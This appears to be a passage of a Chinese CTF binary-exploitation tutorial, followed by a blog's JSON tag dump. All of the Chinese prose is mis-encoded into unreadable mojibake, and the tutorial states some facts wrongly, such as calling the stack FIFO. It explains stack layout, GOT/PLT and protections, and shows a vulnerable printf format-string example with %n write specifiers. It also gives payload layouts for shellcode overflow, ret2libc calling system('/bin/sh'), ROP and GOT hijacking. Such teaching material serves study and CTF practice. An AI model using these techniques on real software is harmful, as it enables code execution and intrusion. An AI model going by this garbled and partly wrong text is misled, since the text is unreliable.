å½“è¿›ç¨‹è°ƒç”¨mallocç­‰å‡½æ•°åˆ†é…å†…å­˜æ—¶ï¼Œæ–°åˆ†é…çš„å†…å­˜å°±è¢«åŠ¨æ€æ·»åŠ åˆ°å †ä¸Šï¼ˆå †è¢«æ‰©å¼ ï¼‰ï¼› å½“åˆ©ç”¨freeç­‰å‡½æ•°é‡Šæ”¾å†…å­˜æ—¶ï¼Œè¢«é‡Šæ”¾çš„å†…å­˜ä»å †ä¸­è¢«å‰”é™¤ï¼ˆå †è¢«ç¼©å‡ï¼‰ æ ˆ(stack)ï¼š æ ˆåˆç§°å †æ ˆï¼Œæ˜¯ç”¨æˆ·å­˜æ”¾ç¨‹åºä¸´æ—¶åˆ›å»ºçš„å±€éƒ¨å˜é‡ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å‡½æ•°æ‹¬å¼§â€œ&#123;&#125;â€ä¸­å®šä¹‰çš„å˜é‡ ï¼ˆä½†ä¸åŒ…æ‹¬staticå£°æ˜çš„å˜é‡ï¼Œstaticæ„å‘³ç€åœ¨æ•°æ®æ®µä¸­å­˜æ”¾å˜é‡ï¼‰ã€‚é™¤æ­¤ä»¥å¤–ï¼Œåœ¨å‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œå…¶å‚æ•°ä¹Ÿä¼šè¢«å‹å…¥å‘èµ·è°ƒç”¨çš„è¿›ç¨‹æ ˆä¸­ï¼Œ å¹¶ä¸”å¾…åˆ°è°ƒç”¨ç»“æŸåï¼Œå‡½æ•°çš„è¿”å›å€¼ä¹Ÿä¼šè¢«å­˜æ”¾å›æ ˆä¸­ã€‚ç”±äºæ ˆçš„å…ˆè¿›å…ˆå‡º(FIFO)ç‰¹ç‚¹ï¼Œæ‰€ä»¥æ ˆç‰¹åˆ«æ–¹ä¾¿ç”¨æ¥ä¿å­˜/æ¢å¤è°ƒç”¨ç°åœºã€‚ å¸¸è§å¯„å­˜å™¨esp:ç”¨æ¥å­˜å‚¨å‡½æ•°è°ƒç”¨æ ˆçš„æ ˆé¡¶åœ°å€ï¼Œåœ¨å‹æ ˆå’Œé€€æ ˆæ—¶å‘ç”Ÿå˜åŒ– ebp:ç”¨æ¥å­˜å‚¨å½“å‰å‡½æ•°çŠ¶æ€çš„åŸºåœ°å€ï¼Œåœ¨å‡½æ•°è¿è¡Œæ—¶ä¸å˜ï¼Œå¯ä»¥ç”¨æ¥ç´¢å¼•ç¡®å®šå‡½æ•°å‚æ•°æˆ–å±€éƒ¨å˜é‡çš„ä½ç½® eip:ç”¨æ¥å­˜å‚¨å³å°†æ‰§è¡Œçš„ç¨‹åºæŒ‡ä»¤çš„åœ°å€ï¼Œcpu ä¾ç…§ eip çš„å­˜å‚¨å†…å®¹è¯»å–æŒ‡ä»¤å¹¶æ‰§è¡Œï¼Œeip éšä¹‹æŒ‡å‘ç›¸é‚»çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œå¦‚æ­¤åå¤ï¼Œç¨‹åºå°±å¾—ä»¥è¿ç»­æ‰§è¡ŒæŒ‡ä»¤ å‡½æ•°è°ƒç”¨æ—¶æ ˆçš„å˜åŒ– é¦–å…ˆå°†è¢«è°ƒç”¨å‡½æ•°çš„å‚æ•°æŒ‰ç…§é€†åºä¾æ¬¡å‹å…¥æ ˆå†…ï¼Œæ²¡æœ‰å‚æ•°åˆ™æ²¡æœ‰è¿™ä¸€æ­¥ å°†è¢«è°ƒç”¨å‡½æ•°çš„è¿”å›åœ°å€å‹å…¥æ ˆå†… å°†è°ƒç”¨å‡½æ•°çš„åŸºåœ°å€ï¼ˆebpï¼‰å‹å…¥æ ˆå†…ï¼Œå¹¶å°†å½“å‰æ ˆé¡¶åœ°å€ä¼ åˆ° ebp å¯„å­˜å™¨å†… å°†è¢«è°ƒç”¨å‡½æ•°çš„å±€éƒ¨å˜é‡å‹å…¥æ ˆå†… å°†è¢«è°ƒç”¨å‡½æ•°çš„å±€éƒ¨å˜é‡å¼¹å‡ºæ ˆå¤– å°†è°ƒç”¨å‡½æ•°çš„åŸºåœ°å€ï¼ˆebpï¼‰å¼¹å‡ºæ ˆå¤–ï¼Œå¹¶å­˜åˆ° ebp å¯„å­˜å™¨å†… å°†è¢«è°ƒç”¨å‡½æ•°çš„è¿”å›åœ°å€å¼¹å‡ºæ ˆå¤–ï¼Œå¹¶å­˜åˆ° eip å¯„å­˜å™¨å†… GOTå’ŒPLTè¡¨GOT å…¨ç§°æ˜¯å…¨å±€åç§»é‡è¡¨ï¼ˆGlobal Offset Tableï¼‰ï¼Œç”¨æ¥å­˜å‚¨å¤–éƒ¨å‡½æ•°åœ¨å†…å­˜çš„ç¡®åˆ‡åœ°å€ã€‚GOT å­˜å‚¨åœ¨æ•°æ®æ®µï¼ˆData Segmentï¼‰å†…ï¼Œå¯ä»¥åœ¨ç¨‹åºè¿è¡Œä¸­è¢«ä¿®æ”¹ã€‚PLT å…¨ç§°æ˜¯ç¨‹åºé“¾æ¥è¡¨ï¼ˆProcedure Linkage Tableï¼‰ï¼Œç”¨æ¥å­˜å‚¨å¤–éƒ¨å‡½æ•°çš„å…¥å£ç‚¹ï¼ˆentryï¼‰ï¼Œæ¢è¨€ä¹‹ç¨‹åºæ€»ä¼šåˆ° PLT è¿™é‡Œå¯»æ‰¾å¤–éƒ¨å‡½æ•°çš„åœ°å€ã€‚PLT å­˜å‚¨åœ¨ä»£ç æ®µï¼ˆCode Segmentï¼‰å†…ï¼Œåœ¨è¿è¡Œä¹‹å‰å°±å·²ç»ç¡®å®šå¹¶ä¸”ä¸ä¼šè¢«ä¿®æ”¹ï¼Œæ‰€ä»¥ PLT å¹¶ä¸ä¼šçŸ¥é“ç¨‹åºè¿è¡Œæ—¶åŠ¨æ€é“¾æ¥åº“è¢«åŠ è½½çš„ç¡®åˆ‡ä½ç½®ã€‚PLT è¡¨å†…å­˜å‚¨çš„å…¥å£ç‚¹å°±æ˜¯ GOT è¡¨ä¸­å¯¹åº”æ¡ç›®çš„åœ°å€ã€‚ ç¨‹åºçš„ä¿æŠ¤æœºåˆ¶CANNARY(æ ˆä¿æŠ¤)è¿™ä¸ªé€‰é¡¹è¡¨ç¤ºæ ˆä¿æŠ¤åŠŸèƒ½æœ‰æ²¡æœ‰å¼€å¯ã€‚æ ˆæº¢å‡ºä¿æŠ¤æ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µï¼Œå½“å‡½æ•°å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥è¦†ç›–æ ˆä¸Šçš„è¿”å›åœ°å€æ¥è®©shellcodeèƒ½å¤Ÿå¾—åˆ°æ‰§è¡Œã€‚å½“å¯ç”¨æ ˆä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆé‡Œæ’å…¥cookieä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯cookieä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°†cookieä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢shellcodeçš„æ‰§è¡Œã€‚åœ¨Linuxä¸­æˆ‘ä»¬å°†cookieä¿¡æ¯ç§°ä¸ºcanaryã€‚ PIEï¼ˆASLRï¼‰ä¸€èˆ¬æƒ…å†µä¸‹NXï¼ˆWindowså¹³å°ä¸Šç§°å…¶ä¸ºDEPï¼‰å’Œåœ°å€ç©ºé—´åˆ†å¸ƒéšæœºåŒ–ï¼ˆASLRï¼‰ä¼šåŒæ—¶å·¥ä½œã€‚å†…å­˜åœ°å€éšæœºåŒ–æœºåˆ¶ï¼ˆaddress space layout randomization)ï¼Œæœ‰ä»¥ä¸‹ä¸‰ç§æƒ…å†µ: 0 - è¡¨ç¤ºå…³é—­è¿›ç¨‹åœ°å€ç©ºé—´éšæœºåŒ–ã€‚ 1 - è¡¨ç¤ºå°†mmapçš„åŸºå€ï¼Œstackå’Œvdsoé¡µé¢éšæœºåŒ–ã€‚ 2 - è¡¨ç¤ºåœ¨1çš„åŸºç¡€ä¸Šå¢åŠ æ ˆï¼ˆheapï¼‰çš„éšæœºåŒ–ã€‚ å¯ä»¥é˜²èŒƒåŸºäºRet2libcæ–¹å¼çš„é’ˆå¯¹DEPçš„æ”»å‡»ã€‚ASLRå’ŒDEPé…åˆä½¿ç”¨ï¼Œèƒ½æœ‰æ•ˆé˜»æ­¢æ”»å‡»è€…åœ¨å †æ ˆä¸Šè¿è¡Œæ¶æ„ä»£ç ã€‚ NXï¼ˆDEPï¼‰(æ•°æ®æ‰§è¡Œä¿æŠ¤ Data Execution Prevention)NXå³No-eXecuteï¼ˆä¸å¯æ‰§è¡Œï¼‰çš„æ„æ€ï¼ŒNXï¼ˆDEPï¼‰çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚ æ£€æµ‹æ–¹æ³• åœ¨å®‰è£…è¿‡pwntoolsç»ˆç«¯è¾“å…¥checksec+æ–‡ä»¶å æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸå› ï¼šæ­£ç¡®ä½¿ç”¨printfæ˜¯è¿™æ ·çš„ï¼š 12345678#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;int main()&#123; int n&#x3D;5; printf(&quot;%d&quot;,n); return 0;&#125; ä¹Ÿæœ‰äººè¿™æ ·ï¼š 12345678#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;int main()&#123; char a[]&#x3D;&quot;neuqcsa&quot;; printf(a); return 0;&#125; ä¸Šé¢çš„ä»£ç ä¸ä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯å¦‚æœå°†å­—ç¬¦ä¸²çš„è¾“å…¥æƒäº¤ç»™ç”¨æˆ·å°±ä¼šæœ‰é—®é¢˜äº†ã€‚çœ‹ä¸‹é¢çš„ä»£ç ï¼š 123456789#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;int main()&#123; char a[100]; scanf(&quot;%s&quot;,a); printf(a); return 0;&#125; å¦‚æœç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²æ˜¯â€%x%x%xâ€ï¼Œåˆ™ä¼šè¾“å‡ºä»¥ä¸‹ç»“æœï¼š å›¾ç‰‡ä¸Šæ˜¾ç¤ºçš„æ˜¯å†…å­˜çš„æ•°æ®ï¼Œä»¥ä¸Šå°±æ˜¯äº§ç”Ÿæ¼æ´çš„åŸå› äº† ä¸€äº›å‚æ•°: %cï¼šè¾“å‡ºå­—ç¬¦ï¼Œé…ä¸Š%nå¯ç”¨äºå‘æŒ‡å®šåœ°å€å†™æ•°æ®ã€‚ %dï¼šè¾“å‡ºåè¿›åˆ¶æ•´æ•°ï¼Œé…ä¸Š%nå¯ç”¨äºå‘æŒ‡å®šåœ°å€å†™æ•°æ®ã€‚ %xï¼šè¾“å‡º16è¿›åˆ¶æ•°æ®ï¼Œå¦‚%i$xè¡¨ç¤ºè¦æ³„æ¼åç§»iå¤„4å­—èŠ‚é•¿çš„16è¿›åˆ¶æ®ï¼Œ %i$lxè¡¨ç¤ºè¦æ³„æ¼åç§»iå¤„8å­—èŠ‚é•¿çš„16è¿›åˆ¶æ•°æ®ï¼Œ32bitå’Œ64bitç¯å¢ƒä¸‹ä¸€æ ·ã€‚ %pï¼šè¾“å‡º16è¿›åˆ¶æ•°æ®ï¼Œä¸%xåŸºæœ¬ä¸€æ ·ï¼Œåªæ˜¯é™„åŠ äº†å‰ç¼€0xï¼Œåœ¨32bitä¸‹è¾“å‡º4å­—èŠ‚ï¼Œ åœ¨64bitä¸‹è¾“å‡º8å­—èŠ‚ï¼Œå¯é€šè¿‡è¾“å‡ºå­—èŠ‚çš„é•¿åº¦æ¥åˆ¤æ–­ç›®æ ‡ç¯å¢ƒæ˜¯32bitè¿˜æ˜¯64bitã€‚ %sï¼šè¾“å‡ºçš„å†…å®¹æ˜¯å­—ç¬¦ä¸²ï¼Œå³å°†åç§»å¤„æŒ‡é’ˆæŒ‡å‘çš„å­—ç¬¦ä¸²è¾“å‡ºï¼Œ å¦‚%i$sè¡¨ç¤ºè¾“å‡ºåç§»iå¤„åœ°å€æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œ åœ¨32bitå’Œ64bitç¯å¢ƒä¸‹ä¸€æ ·ï¼Œå¯ç”¨äºè¯»å–GOTè¡¨ç­‰ä¿¡æ¯ã€‚ %nï¼šå°†%nä¹‹å‰printfå·²ç»æ‰“å°çš„å­—ç¬¦ä¸ªæ•°èµ‹å€¼ç»™åç§»å¤„æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ä½ç½®ï¼Œ å¦‚%100Ã—10$nè¡¨ç¤ºå°†0x64å†™å…¥åç§»10å¤„ä¿å­˜çš„æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ï¼ˆ4å­—èŠ‚ï¼‰ï¼Œ è€Œ%$hnè¡¨ç¤ºå†™å…¥çš„åœ°å€ç©ºé—´ä¸º2å­—èŠ‚ï¼Œ %$hhnè¡¨ç¤ºå†™å…¥çš„åœ°å€ç©ºé—´ä¸º1å­—èŠ‚ï¼Œ %$llnè¡¨ç¤ºå†™å…¥çš„åœ°å€ç©ºé—´ä¸º8å­—èŠ‚ï¼Œåœ¨32bitå’Œ64bitç¯å¢ƒä¸‹ä¸€æ ·ã€‚ æœ‰æ—¶ï¼Œç›´æ¥å†™4å­—èŠ‚ä¼šå¯¼è‡´ç¨‹åºå´©æºƒæˆ–ç­‰å€™æ—¶é—´è¿‡é•¿ï¼Œå¯ä»¥é€šè¿‡%$hnæˆ–%$hhnæ¥é€‚æ—¶è°ƒæ•´ã€‚ %næ˜¯é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ”¹å˜ç¨‹åºæµç¨‹çš„å…³é”®æ–¹å¼ï¼Œ è€Œå…¶ä»–æ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°å¯ç”¨äºè¯»å–ä¿¡æ¯æˆ–é…åˆ%nå†™æ•°æ®ã€‚ æ¼æ´åˆ©ç”¨ æ ˆæº¢å‡ºåŸç†ï¼šè®© eip è½½å…¥æ”»å‡»æŒ‡ä»¤çš„åœ°å€ shellcodeå‰æï¼šåœ¨å‡½æ•°è°ƒç”¨æ ˆä¸Šçš„æ•°æ®ï¼ˆshellcodeï¼‰è¦æœ‰å¯æ‰§è¡Œçš„æƒé™ï¼Œå¹¶ä¸”å…³é—­å†…å­˜å¸ƒå±€éšæœºåŒ– åŸç†ï¼šä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘æº¢å‡ºæ•°æ®ä¸­çš„ä¸€æ®µæŒ‡ä»¤ payload : padding1 + address of shellcode + padding2 + shellcode å…·ä½“ç»†èŠ‚ï¼š **padding1:**ä»£è¡¨å‡½æ•°å‚æ•°ï¼Œé€†åºè¿›å…¥æ ˆä¸­ï¼Œå¯ä»¥éšæ„å¡«å……,é•¿åº¦åº”è¯¥åˆšå¥½è¦†ç›–å‡½æ•°çš„åŸºåœ°å€ è·å–é•¿åº¦æ–¹æ³•ï¼š1.æŸ¥çœ‹æ±‡ç¼–ä»£ç  2.è¿è¡Œç¨‹åºæ—¶ç”¨ä¸æ–­å¢åŠ è¾“å…¥é•¿åº¦çš„æ–¹æ³•æ¥è¯•æ¢ **address of shellcode:**shellcode èµ·å§‹å¤„çš„åœ°å€ï¼Œç”¨æ¥è¦†ç›–è¿”å›åœ°å€ padding2ï¼šå¯ä»¥éšæ„å¡«å……ï¼Œé•¿åº¦å¯ä»¥ä»»æ„ **shellcode:**åº”ä¸ºåå…­è¿›åˆ¶çš„æœºå™¨ç æ ¼å¼ Return2libcå‰æï¼šæ“ä½œç³»ç»Ÿå…³é—­å†…å­˜å¸ƒå±€éšæœºåŒ–ï¼ˆASLRï¼‰ï¼Œè€Œä¸” shellcode è¿˜éœ€è¦ç¨‹åºè°ƒç”¨æ ˆæœ‰å¯æ‰§è¡Œæƒé™ **åŸç†:**ä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„æŸä¸ªå‡½æ•° payload: padding1 + address of system() + padding2 + address of â€œ/bin/shâ€ å…·ä½“ç»†èŠ‚ï¼š address of system()ï¼šæ˜¯ system() åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œç”¨æ¥è¦†ç›–è¿”å›åœ°å€ ç¨‹åºæ˜¯å¦‚ä½•è°ƒç”¨åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°çš„è¿‡ç¨‹ï¼š å½“å‡½æ•°è¢«åŠ¨æ€é“¾æ¥è‡³ç¨‹åºä¸­ï¼Œç¨‹åºåœ¨è¿è¡Œæ—¶é¦–å…ˆç¡®å®šåŠ¨æ€é“¾æ¥åº“åœ¨å†…å­˜çš„èµ·å§‹åœ°å€ï¼Œå†åŠ ä¸Šå‡½æ•°åœ¨åŠ¨æ€åº“ä¸­çš„ç›¸å¯¹åç§»é‡ï¼Œæœ€ç»ˆå¾—åˆ°å‡½æ•°åœ¨å†…å­˜çš„ç»å¯¹åœ°å€ padding2ï¼šè¯¥å¤„çš„æ•°æ®é•¿åº¦ä¸º4ï¼ˆ32ä½æœºï¼‰ï¼Œå¯¹åº”è°ƒç”¨ system() æ—¶çš„è¿”å›åœ°å€ address of â€œ/bin/shâ€ï¼šæ˜¯å­—ç¬¦ä¸² â€œ/bin/shâ€ åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œä½œä¸ºä¼ ç»™ system() çš„å‚æ•°ã€‚ ROP ( Return Oriented Programming )å‰æï¼š åŸç†ï¼šä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„ä¸€æ®µæŒ‡ä»¤ payload1 : padding + address of gadget payload2 : padding + address of gadget 1 + address of gadget 2 + ...... + address of gadget n å…·ä½“ç»†èŠ‚ï¼š Hijack GOTå‰æï¼š åŸç†ï¼šä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€ï¼Œè®©å…¶æŒ‡å‘å¦ä¸€ä¸ªå‡½æ•° å…·ä½“ç»†èŠ‚ï¼š ä¸€äº›å·¥å…·çš„ä½¿ç”¨IDAgdbCyclicçš„ä½¿ç”¨ç®€ä»‹ï¼šCyclic patternæ˜¯ä¸€ä¸ªå¾ˆå¼ºå¤§çš„åŠŸèƒ½ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯ï¼Œä½¿ç”¨pwntoolsç”Ÿæˆä¸€ä¸ªpatternï¼Œpatternå°±æ˜¯æŒ‡ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¯ä»¥é€šè¿‡å…¶ä¸­çš„ä¸€éƒ¨åˆ†æ•°æ®å»å®šä½åˆ°ä»–åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„ä½ç½®ã€‚ å‘½ä»¤ï¼š cyclic 100 ç”¨æ¥ç”Ÿæˆä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ä¸²ï¼Œéšæ„å–éƒ½ä¸é‡å¤ cyclic -l å­—ç¬¦ä¸² æŸ¥æ‰¾å­—ç¬¦ä¸²ä½ç½®","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"http://www.m00nback.xyz/tags/pwn/"},{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","permalink":"http://www.m00nback.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"}]}],"categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"crypto","slug":"crypto","permalink":"http://www.m00nback.xyz/tags/crypto/"},{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"å¼ºç½‘æ¯","slug":"å¼ºç½‘æ¯","permalink":"http://www.m00nback.xyz/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"},{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","permalink":"http://www.m00nback.xyz/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"ISCC","slug":"ISCC","permalink":"http://www.m00nback.xyz/tags/ISCC/"},{"name":"Vulhub","slug":"Vulhub","permalink":"http://www.m00nback.xyz/tags/Vulhub/"},{"name":"CVE","slug":"CVE","permalink":"http://www.m00nback.xyz/tags/CVE/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://www.m00nback.xyz/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"NPUCTF","slug":"NPUCTF","permalink":"http://www.m00nback.xyz/tags/NPUCTF/"},{"name":"å¢¨è€…å­¦é™¢","slug":"å¢¨è€…å­¦é™¢","permalink":"http://www.m00nback.xyz/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"},{"name":"MRCTF","slug":"MRCTF","permalink":"http://www.m00nback.xyz/tags/MRCTF/"},{"name":"Python","slug":"Python","permalink":"http://www.m00nback.xyz/tags/Python/"},{"name":"æœªæˆæƒè®¿é—®","slug":"æœªæˆæƒè®¿é—®","permalink":"http://www.m00nback.xyz/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"name":"Redis","slug":"Redis","permalink":"http://www.m00nback.xyz/tags/Redis/"},{"name":"Docker","slug":"Docker","permalink":"http://www.m00nback.xyz/tags/Docker/"},{"name":"mysql","slug":"mysql","permalink":"http://www.m00nback.xyz/tags/mysql/"},{"name":"ææƒ","slug":"ææƒ","permalink":"http://www.m00nback.xyz/tags/%E6%8F%90%E6%9D%83/"},{"name":"æŠ˜è…¾","slug":"æŠ˜è…¾","permalink":"http://www.m00nback.xyz/tags/%E6%8A%98%E8%85%BE/"},{"name":"ä¸­é—´äººæ”»å‡»","slug":"ä¸­é—´äººæ”»å‡»","permalink":"http://www.m00nback.xyz/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"name":"php","slug":"php","permalink":"http://www.m00nback.xyz/tags/php/"},{"name":"BJDCTF","slug":"BJDCTF","permalink":"http://www.m00nback.xyz/tags/BJDCTF/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"ctftime","slug":"ctftime","permalink":"http://www.m00nback.xyz/tags/ctftime/"},{"name":"å¤ç°","slug":"å¤ç°","permalink":"http://www.m00nback.xyz/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"thinkphp","slug":"thinkphp","permalink":"http://www.m00nback.xyz/tags/thinkphp/"},{"name":"vulhub","slug":"vulhub","permalink":"http://www.m00nback.xyz/tags/vulhub/"},{"name":"phpmyadmin","slug":"phpmyadmin","permalink":"http://www.m00nback.xyz/tags/phpmyadmin/"},{"name":"linux","slug":"linux","permalink":"http://www.m00nback.xyz/tags/linux/"},{"name":"å¼±å£ä»¤","slug":"å¼±å£ä»¤","permalink":"http://www.m00nback.xyz/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"},{"name":"msf","slug":"msf","permalink":"http://www.m00nback.xyz/tags/msf/"},{"name":"æ—¥å¿—","slug":"æ—¥å¿—","permalink":"http://www.m00nback.xyz/tags/%E6%97%A5%E5%BF%97/"},{"name":"CTFshow","slug":"CTFshow","permalink":"http://www.m00nback.xyz/tags/CTFshow/"},{"name":"wirteup","slug":"wirteup","permalink":"http://www.m00nback.xyz/tags/wirteup/"},{"name":"python","slug":"python","permalink":"http://www.m00nback.xyz/tags/python/"},{"name":"ssti","slug":"ssti","permalink":"http://www.m00nback.xyz/tags/ssti/"},{"name":"pop","slug":"pop","permalink":"http://www.m00nback.xyz/tags/pop/"},{"name":"VulnHub","slug":"VulnHub","permalink":"http://www.m00nback.xyz/tags/VulnHub/"},{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://www.m00nback.xyz/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"xss","slug":"xss","permalink":"http://www.m00nback.xyz/tags/xss/"},{"name":"HAGAME","slug":"HAGAME","permalink":"http://www.m00nback.xyz/tags/HAGAME/"},{"name":"NetCat","slug":"NetCat","permalink":"http://www.m00nback.xyz/tags/NetCat/"},{"name":"Nmap","slug":"Nmap","permalink":"http://www.m00nback.xyz/tags/Nmap/"},{"name":"WireShack","slug":"WireShack","permalink":"http://www.m00nback.xyz/tags/WireShack/"},{"name":"bypass","slug":"bypass","permalink":"http://www.m00nback.xyz/tags/bypass/"},{"name":"httpèµ°ç§","slug":"httpèµ°ç§","permalink":"http://www.m00nback.xyz/tags/http%E8%B5%B0%E7%A7%81/"},{"name":"buuctf","slug":"buuctf","permalink":"http://www.m00nback.xyz/tags/buuctf/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"http://www.m00nback.xyz/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"ä»£ç æ³¨å…¥","slug":"ä»£ç æ³¨å…¥","permalink":"http://www.m00nback.xyz/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"},{"name":"å‘½ä»¤æ‰§è¡Œ","slug":"å‘½ä»¤æ‰§è¡Œ","permalink":"http://www.m00nback.xyz/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"http://www.m00nback.xyz/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://www.m00nback.xyz/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"wpscan","slug":"wpscan","permalink":"http://www.m00nback.xyz/tags/wpscan/"},{"name":"wordpress","slug":"wordpress","permalink":"http://www.m00nback.xyz/tags/wordpress/"},{"name":"ä¼ªéšæœºæ•°","slug":"ä¼ªéšæœºæ•°","permalink":"http://www.m00nback.xyz/tags/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"},{"name":"GXY","slug":"GXY","permalink":"http://www.m00nback.xyz/tags/GXY/"},{"name":"hash","slug":"hash","permalink":"http://www.m00nback.xyz/tags/hash/"},{"name":"xxe","slug":"xxe","permalink":"http://www.m00nback.xyz/tags/xxe/"},{"name":"MSF","slug":"MSF","permalink":"http://www.m00nback.xyz/tags/MSF/"},{"name":"shell","slug":"shell","permalink":"http://www.m00nback.xyz/tags/shell/"},{"name":"CTFd","slug":"CTFd","permalink":"http://www.m00nback.xyz/tags/CTFd/"},{"name":"docker","slug":"docker","permalink":"http://www.m00nback.xyz/tags/docker/"},{"name":"ç¯å¢ƒæ­å»º","slug":"ç¯å¢ƒæ­å»º","permalink":"http://www.m00nback.xyz/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"name":"phpå‡½æ•°","slug":"phpå‡½æ•°","permalink":"http://www.m00nback.xyz/tags/php%E5%87%BD%E6%95%B0/"},{"name":"rce","slug":"rce","permalink":"http://www.m00nback.xyz/tags/rce/"},{"name":"JWT","slug":"JWT","permalink":"http://www.m00nback.xyz/tags/JWT/"},{"name":"wp","slug":"wp","permalink":"http://www.m00nback.xyz/tags/wp/"},{"name":"SYC","slug":"SYC","permalink":"http://www.m00nback.xyz/tags/SYC/"},{"name":"Aircrack-ng","slug":"Aircrack-ng","permalink":"http://www.m00nback.xyz/tags/Aircrack-ng/"},{"name":"wifiç ´è§£","slug":"wifiç ´è§£","permalink":"http://www.m00nback.xyz/tags/wifi%E7%A0%B4%E8%A7%A3/"},{"name":"kali","slug":"kali","permalink":"http://www.m00nback.xyz/tags/kali/"},{"name":"hackgame","slug":"hackgame","permalink":"http://www.m00nback.xyz/tags/hackgame/"},{"name":"åšå®¢","slug":"åšå®¢","permalink":"http://www.m00nback.xyz/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"hexo","slug":"hexo","permalink":"http://www.m00nback.xyz/tags/hexo/"},{"name":"webshell","slug":"webshell","permalink":"http://www.m00nback.xyz/tags/webshell/"},{"name":"jarvisoj","slug":"jarvisoj","permalink":"http://www.m00nback.xyz/tags/jarvisoj/"},{"name":"bugku","slug":"bugku","permalink":"http://www.m00nback.xyz/tags/bugku/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","permalink":"http://www.m00nback.xyz/tags/%E6%96%87%E4